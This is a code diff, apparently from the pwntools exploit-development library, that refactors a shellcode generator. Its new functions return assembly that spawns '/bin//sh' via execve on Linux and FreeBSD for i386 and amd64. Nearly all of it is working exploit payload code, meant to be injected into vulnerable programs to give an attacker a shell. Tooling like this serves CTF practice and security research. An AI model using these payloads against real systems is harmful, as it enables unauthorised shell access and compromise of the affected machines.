@@ -1,68 +1,98 @@
 from pwn.internal.shellcode_helper import *
 
-@shellcode_reqs(arch='i386', os=['linux', 'freebsd'])
-def sh(clear_ecx = True, os = None):
-    """Args: [clear_ecx = True]
-    Spawn a shell.
+@shellcode_reqs(arch=['i386', 'amd64'], os=['linux', 'freebsd'])
+def sh(arch = None, os = None):
+    """Spawn a shell."""
 
-    Set clear_ecx to False to shave of a few bytes if ecx is already 0.
-    """
+    if arch == 'i386':
+        if os == 'linux':
+            return _sh_linux_i386()
+        elif os == 'freebsd':
+            return _sh_freebsd_i386()
+    elif arch == 'amd64':
+        if os == 'linux':
+            return _sh_linux_amd64()
+        elif os == 'freebsd':
+            return _sh_freebsd_amd64()
 
-    if os not in ['linux', 'freebsd']:
-        bug('OS was neither linux or freebsd')
+    bug('OS/arch combination (%s,%s) is not supported' % (os,arch))
 
-    if os == 'freebsd':
-        if not clear_ecx:
-            return """
-            ; eax = "/bin//sh"
-            push ecx
-            push `//sh`
-            push `/bin`
-            mov eax, esp
+def _sh_freebsd_i386():
+    return """
+        xor eax, eax
+        push eax
+        push `//sh`
+        push `/bin`
+        mov ecx, esp
 
-            ; execve("/bin//sh", {junk, 0}, {0});
-            push ecx
-            push esp
-            push esp
-            push eax
-            push ecx
-            push SYS_execve
-            pop eax
-            int 0x80"""
-        else:
-            return """
-            ; ecx = "/bin//sh"
-            xor eax, eax
-            push eax
-            push `//sh`
-            push `/bin`
-            mov ecx, esp
+        ; execve("/bin//sh", {junk, 0}, {0});
+        push eax
+        push esp
+        push esp
+        push ecx
+        push eax
+        mov al, SYS_execve
+        int 0x80
+"""
 
-            ; execve("/bin//sh", {junk, 0}, {0});
-            push eax
-            push esp
-            push esp
-            push ecx
-            push eax
-            mov al, SYS_execve
-            int 0x80"""
-
-    if clear_ecx:
-        clear_ecx = 'xor ecx, ecx\n'
-    else:
-        clear_ecx = ''
-
+def _sh_linux_i386():
     return """
         ;; Clear eax, ecx, edx
-        %simul ecx
+        xor ecx, ecx
+        imul ecx
 
         ;; Push '/bin//sh'
         push eax
         push `//sh`
         push `/bin`
 
-        ;; Call execve
+        ;; Call execve("/bin//sh", 0, 0)
         mov al, SYS_execve
         mov ebx, esp
         int 0x80
-""" % clear_ecx
+"""
+
+def _sh_linux_amd64():
+    return """
+        mov rax, '/bin//sh'
+
+        ;; clear rdx and rsi
+        cdq
+        mov esi, edx
+
+        ;; push '/bin//sh\\0'
+        push rdx
+        push rax
+
+        ;; Call execve("/bin//sh", 0, 0)
+        mov rdi, rsp
+        push SYS64_execve
+        pop rax
+        syscall
+"""
+
+def _sh_freebsd_amd64():
+    return """
+        mov rax, '/bin//sh'
+
+        ;; clear rdx
+        cdq
+
+        ;; push '/bin//sh\\0'
+        push rdx
+        push rax
+
+        ;; Setup argv[0]
+        mov rdi, rsp
+
+        ;; Setup argv + envp
+        push rdx
+        mov rdx, rsp
+        push rdi
+        mov rsi, rsp
+
+        ;; Call execve("/bin//sh", {"/bin//sh", 0}, {0})
+        push SYS64_execve
+        pop rax
+        syscall
+"""
